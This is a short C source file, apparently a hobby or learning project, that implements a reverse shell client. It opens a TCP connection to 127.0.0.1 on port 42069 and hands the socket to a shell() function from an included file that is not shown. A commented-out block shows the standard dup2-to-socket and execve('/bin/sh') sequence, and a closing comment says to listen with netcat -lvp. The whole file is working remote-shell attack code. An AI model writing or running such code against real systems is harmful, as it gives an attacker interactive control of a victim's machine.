#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "commands.c"

int main ()
{
    
    const char* ip = "127.0.0.1";
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(42069);
    inet_aton(ip, &addr.sin_addr);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    shell(sockfd);
    /*
    for (int i = 0; i < 3; i++)
    {
        dup2(sockfd, i);
    }

    execve("/bin/sh", NULL, NULL);
    */
    return 0;
}

//USE -LVP options in NETCAT!!!!!!!!!!